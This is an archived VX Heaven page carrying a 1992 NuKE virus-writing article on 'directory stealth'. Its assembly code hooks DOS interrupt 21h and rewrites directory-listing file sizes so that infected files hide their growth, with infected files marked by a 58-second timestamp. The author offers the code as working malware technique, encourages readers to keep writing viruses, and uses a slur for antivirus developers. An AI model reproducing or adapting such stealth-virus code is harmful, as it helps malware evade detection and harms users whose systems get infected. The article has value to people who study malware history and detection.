<?xml version="1.0"?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"><html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
<head>
<title> Rock Steady 'Directory Stealth' (VX heaven)</title>
<meta http-equiv="content-type" content="text/html; charset=utf-8"/>
<meta name="Author" content="Rock Steady"/>
<meta name="KeyWords" lang="en" content="computer virus, virus, virii,vx, компьютерные вирусы, вирус, вири, Rock Steady,Directory Stealth, stealth, extended, seconds, infected, drive, file, call, virus, order, simple, successful, record, back, feature, filesize"/>
<meta name="Description" content="Stealth Viruses are the Viruses that I must admit Anti-Viral Queers Don't tend to like at all. Emagine if we added a polymorphic feature into the Stealth Virus? But, if you want to Continue Writing Viruses you have to make them Stealth. MS-DOS Version 6.0 Now comes with Virus Scanners and CRC &amp;amp; Checksum Checkers. In order to stop many viruses, But it will NEVER stop the `Stealth' Virus that is SMART of those AV features!"/>
<script type="text/javascript">
//<![CDATA[
try{if (!window.CloudFlare) {var CloudFlare=[{verbose:0,p:0,byc:0,owlid:"cf",bag2:1,mirage2:0,oracle:0,paths:{cloudflare:"/cdn-cgi/nexp/dok3v=1613a3a185/"},atok:"047a5bcbf67431883fc9ed25fba33612",petok:"b0b7323cf6f1bcdc9c5af5e4cf51bcf6a0374016-1498756103-1800",zone:"vxheaven.org",rocket:"a",apps:{}}];document.write('<script type="text/javascript" src="//ajax.cloudflare.com/cdn-cgi/nexp/dok3v=85b614c0f6/cloudflare.min.js"><'+'\/script>');}}catch(e){};
//]]>
</script>
<link rel="icon" href="/favicon.ico" type="image/x-icon"/>
<link rel="shortcut icon" href="/favicon.ico" type="image/x-icon"/>
<link rel="stylesheet" type="text/css" href="/style.css"/><link rel="canonical" href="http://vxheaven.org/lib/vrs02.html"/>
<script type="text/rocketscript" data-rocketsrc="https://apis.google.com/js/plusone.js">{"parsetags": "explicit"}</script>
</head>
<body bgcolor="#dbc8a0" text="#302000" link="#225599" vlink="#113366">
<div class="s1">
<div style="float:right;"><a href="/lib/index.php?tbs=1"><img src="/img/max.gif" alt="Maximize"/></a></div> <form id="lf" style="margin: 0; float: right;" method="get" action="/index.php"><input type="hidden" name="action" value="set"/><select name="lang" onchange="javascript:document.getElementById('lf').submit();"><option value="ru">Русский</option><option selected="selected" value="en">English</option><option value="ua">Українська</option><option value="de">Deutsch</option><option value="es">Español</option><option value="fr">Fran&ccedil;ais</option><option value="it">Italiano</option><option value="pl">Polski</option></select></form>
<div style="float: right;"><div id="plusone"></div></div>
<script type="text/rocketscript">gapi.plusone.render("plusone", {"size":"small","count":"true"});</script>
<div style="float: right;" class="addthis_toolbox addthis_default_style">
<script type="text/rocketscript">var addthis_config = { ui_click: true }</script>
<a style="text-decoration: none; font-size: 10pt;" href="/?action=addthis" class="addthis_button_compact">Bookmark</a>
<script type="text/rocketscript" data-rocketsrc="http://s7.addthis.com/js/250/addthis_widget.js#username=herm1t"></script>
</div>
<div style="float: right;">
<script type="text/rocketscript" data-rocketsrc="http://www.google.com/cse/brand?form=cse-search-box&amp;lang=en"></script>
<form action="/search.php" id="cse-search-box">
<input type="hidden" name="cx" value="002577580816726040001:z9_irkorydo"/>
<input type="hidden" name="cof" value="FORID:10"/>
<input type="hidden" name="ie" value="UTF-8"/>
<input type="text" name="q" size="12" value=" "/>
<input type="submit" name="sa" value="Search"/>
</form>
</div><h1><a href="/" style="text-decoration: none; color: #000000;">VX Heaven</a></h1>
<span class="nav"><a href="/lib/">Library</a> <a href="/vl.php">Collection</a> <a href="/src.php">Sources</a> <a href="/vx.php?id=eidx">Engines</a> <a href="/vx.php?id=tidx">Constructors</a> <a href="/vx.php?id=sidx">Simulators</a> <a href="/vx.php?id=uidx">Utilities</a> <a href="/links.php">Links</a> <a href="/donate.php" style="color: #706020" id="donate">Donate</a> <a href="/forum" style="text-decoration: underline;">Forum</a> </span><br clear="all"/>
</div>
<div class="s2"><h1>Directory Stealth</h1><p><a href="/lib/?lang=en&amp;author=Rock%20Steady"> Rock Steady</a><br/> <em><a href="/vx.php?fid=338#f338">Nuke Info Journal [4]</a></em><br/> <em>August 1992</em></p><script type="text/rocketscript">var disqus_url = 'http://vxheaven.org/lib/vrs02.html';</script>[<a style="" href="/lib/?lang=EN&amp;index=DO#vrs02">Back to index</a>] [<a href="/lib/vrs02.html#disqus_thread">Comments</a>]<br/> 
<p>Stealth Viruses are the Viruses that I must admit Anti-Viral Queers Don't tend to like at all. Emagine if we added a polymorphic feature into the Stealth Virus? But, if you want to Continue Writing Viruses you have to make them Stealth. MS-DOS Version 6.0 Now comes with Virus Scanners and CRC &amp; Checksum Checkers. In order to stop many viruses, But it will NEVER stop the `Stealth' Virus that is SMART of those AV features!</p>
<p>People think that there is ALOT of more INFECTED PCs since the virus threat, started in 1986-7. Even though in the beginning only 10 or so viruses were known, they Infected more systems, Compared to the viruses today, where we have about 1300 and growing. But the truth is LESS PCs are getting infect now, as people are now Virus Aware. With all the utilities out, any joker can stop and clean a virus in seconds. Come on, how many people MEMORIZED COMMAND.COM size? Out of my head its 47845 (MS-Dos V5.0). A simple increase of size tells me I got a problem.</p>
<p>A simple Stealth Feature every virus MUST have is the DOS `Dir' Stealth feature. That will NOT show you the INCREASE of file size, when the virus infects it. I have played with a few routines as such. I have tried reducing the File size in the FAT area, which results in the famous CHKDSK error reports of Loss Sectors, or Cross Links... And fixing them with CHKDSK will result in damaging the file for good.</p>
<p>What can we do? How about reducing the File size Right AFTER its read by DOS or any Utilities and right BEFORE its display on the screen! Yeah that's an Idea, Here's how to go about it...</p>
<h2>Theory</h2>
<p>First we must HOOK Int 21h, as every time a `DIR' is done, Int 21h function 11h &amp; 12h is called! If you don't know how to Hook Interrupts Read RESIDENT VIRIIs Article in this NewsLetter.</p>
<pre class="source">
   Int21_Handler:
          cmp     ah,11h                  ;Is a DOS `Dir' being done?
          je      dir_stealth             ;Yes, Jump to `DIR_STEALTH'
          cmp     ah,12h                  ;Is a DOR `Dir' Being done?
          je      dir_stealth             ;Yes, Jump to `DIR_STEALTH'

  Int21Call:
          jmp     dword ptr cs:[Int21]    ;Or Else Goto ORIGINAL Int 21h
          ret                             ;Is need for the CALL of below
</pre>
<p>That's all that is needed in your Int21_Handler. Ofcourse if you are infecting file that are being Execute you add it ABOVE! Anyhow lets Explain the `DIR_STEALTH'</p>
<table border="1" cellspacing="0" cellpadding="0" summary="Normal and extended FCBs">
<tr><th>Offset</th><th>Size</th><th>Description</th></tr>
<tr><th colspan="3">Normal FCB</th></tr>
<tr><td>00h </td><td>1</td><td>Drive Number 00=current drive 01=A,02=B,03=C etc..</td></tr>
<tr><td>01h </td><td>8</td><td>Filename. Unused Spaces padded with Blanks</td></tr>
<tr><td>09h </td><td>3</td><td>Extension of Filename.</td></tr>
<tr><td>0Ch </td><td>2</td><td>Current block. points to block of records</td></tr>
<tr><td>0Eh </td><td>2</td><td>Record Size.</td></tr>
<tr><td>10h </td><td>4</td><td>FileSize in Bytes. (Low-order first, then high-order)</td></tr>
<tr><td>14h </td><td>2</td><td>Date of Last Write. YY-MM-DD into bits YYYY-YYYM-MMMD-DDDD</td></tr>
<tr><td>16h </td><td>2</td><td>Time of Last Write. HH:MM:SS into bits HHHH-HMMM-MMMS-SSSS</td></tr>
<tr><td>18h </td><td>4</td><td>Reserved</td></tr>
<tr><td>*1Ch</td><td>4</td><td>SAME `10h' but THIS FILESIZE gets printed on Screen!</td></tr>
<tr><td>20h </td><td>1</td><td>Offset of current record</td></tr>
<tr><td>21h </td><td>4</td><td>Relative Record</td></tr>
<tr><th colspan="3">Extended FCB</th></tr>
<tr><td>-07h</td><td>1</td><td>ALWAYS FFh tells use this is an Extended FCB</td></tr>
<tr><td>-06h</td><td>5</td><td>Reserved for DOS</td></tr>
<tr><td>-01h</td><td>1</td><td>Attribute Byte</td></tr>
</table>
<p><em>* = Field Changed by virus.</em></p>
<p>Extended FCB: Are Identical to the Normal FCB but, it has three new fields totalling 7 bytes. (That is why we add y to BX) The additional 7 bytes are added to the BEGINNING!</p>
<p>So if we have an Extended FCB the first Byte will be FFh simply INC it and if its ZERO you got a Extended FCB! You can also CMP ES:[BX],FFh but that takes too many Bytes! Be COMPACT!!!</p>
<h2>Algorithms</h2>
<p>CONDISTION: After calling Function 11h/12h (Int 21h) it will search with the contents in the FCB. (*.*) which the DS:DX registers point to the FCB. If successful it will DUPLICATE the specified of the FCB in the current DTA (Disk Transfer Area) And basically we will EDIT the info in the DTA!</p>
<p>NOTE: Just because we are using the DTA doesn't mean this will work for function 4Eh/4Fh (Int 21h) that uses the DTA and ASCIIZ strings to search, that is a different procedure, though somewhat the same as this one. See Method #2, for that.</p>
<p>Step 1. We call the Int 21h so we may have the results to play with BEFORE DOS displays them on screen.</p>
<p>Step 2. Get the Current PSP, As the FCB is located inside the PSP in COM files its CS:0000 - CS:00FF. But in EXEs it can be anywhere, Int21h/AH=51 (Undocemented) will do this for us.</p>
<p>Step 3. Unmask the seconds (see if its infected) Quit if NOT</p>
<p>Step 4. Get the current DTA</p>
<p>Step 5. Test if it is Either an Extended FCB or Normal! If Extended Simple add 7h to the Address. (As Extended only have 7 bytes extra in the begining)</p>
<p>Step 6. Minus File size from the DTA! &amp; Restore Time Back</p>
<pre class="source">
 ; Here it is... Method #1

   dir_stealth:
          pushf                   ;Fake an INT Call
          push    cs              ;Needed to return back HERE! (Virus)
          call    Int21Call       ;Call the interrupt (See `Int21_Handler')
          test    al,al           ;AL=00h if successful
          jnz     no_good         ;Not Successful. Errors Eg:No More Files

          push    ax
          push    bx      ;Save them since they will be used! So when
          push    es      ;We exit all is restored to as Before!
          mov     ah,51h  ;(Undocmented) Gets the Current PSP and puts
          int     21h     ;it into BX

          mov     es,bx         ;ES now has PSP segment Address
          cmp     bx,es:[16h]   ;Did we open a Good PSP?
          jnz     exit_man      ;No, PSP unavailable, Exit Dude
          mov     bx,dx         ;BX now points to the Original FCB in PSP
          mov     al,[bx]       ;AL now has the current drive
          push    ax            ;Save it to tell if its an Extended FCB
          mov     ah,2fh        ;Get DTA (Disk Transfer Address)
          int     21h
  ;Also before we start fiddling around we must know if we are working with
  ;And EXTENDED FCB or the Normal FCB, or else Major Problems! The Extended
  ;Has three fields appended to the normal one... (Above)

          pop     ax            ; AL = FFh if Extended FCB or else Drive #
          inc     al            ; Will tell us if we have an Extended FCB
          jnz     fcb_ok        ; No, We don't continue as normal
          add     bx,7h         ; Yes, we do, add 7h to BX pointer
  fcb_ok: mov     ax,es:[bx+17h]  ;Gets Seconds Field
          and     ax,1fh          ;Unmask to have SECONDS only
          xor     al,1dh          ;is it 58 seconds? (1d * 2)
          jnz     not_infected    ;Nope, okay its not infected
          and     byte ptr es:[bx+17h],0e0h   ;Restores seconds
          sub     es:[bx+1dh],virus_size      ;Subtract FileSize with Virii
          sbb     es:[bx+1fh],ax              ;Needed to fix up Bytes with
  not_infected:                               ;Borrowing
          pop     es              ;Ciao, Ciao
          pop     bx
          pop     ax
  no_good:iret             ;Pretend you came back from an Interrupt call!
  ;----------------------------The EnD-------------------------------------
</pre>
<pre>
                          Rock Steady / NuKE
                 `Feed my Frankenstein', Alice Cooper
</pre>
<p>NOTE: This Code Works, Look at NuKE PoX V1.1 to see it...</p>
<div id="disqus_thread"></div>
<script type="text/rocketscript">
        /* * * CONFIGURATION VARIABLES: EDIT BEFORE PASTING INTO YOUR WEBPAGE * * */
        var disqus_shortname = 'vxheaven'; // required: replace example with your forum shortname

        /* * * DON'T EDIT BELOW THIS LINE * * */
        (function() {
            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
        })();
    </script>
<noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript></div>
<div><small>By accessing, viewing, downloading or otherwise using this content you agree to be bound by the <a href="/agreement.php">Terms of Use</a>!</small> <small>vxheaven.org aka vx.netlux.org</small></div>
<div style="margin-top: 2px; float: left;" class="adsapeu">
<script type="text/rocketscript">
<!--
var _acic={dataProvider:10};(function(){var e=document.createElement("script");e.type="text/javascript";e.async=true;e.src="//www.acint.net/aci.js";var t=document.getElementsByTagName("script")[0];t.parentNode.insertBefore(e,t)})()
//-->
</script>
</div>
<script data-rocketsrc="http://www.google-analytics.com/urchin.js" type="text/rocketscript"></script><script type="text/rocketscript">try { _uacct = "UA-590608-1"; urchinTracker(); } catch(err) {}</script>
<div style="display: none;"><a href="/lib/index.php?lang=de&amp;id=vrs02">de</a><a href="/lib/index.php?lang=en&amp;id=vrs02">en</a><a href="/lib/index.php?lang=es&amp;id=vrs02">es</a><a href="/lib/index.php?lang=it&amp;id=vrs02">it</a><a href="/lib/index.php?lang=fr&amp;id=vrs02">fr</a><a href="/lib/index.php?lang=pl&amp;id=vrs02">pl</a><a href="/lib/index.php?lang=ru&amp;id=vrs02">ru</a><a href="/lib/index.php?lang=ua&amp;id=vrs02">ua</a></div>
</body>
</html>
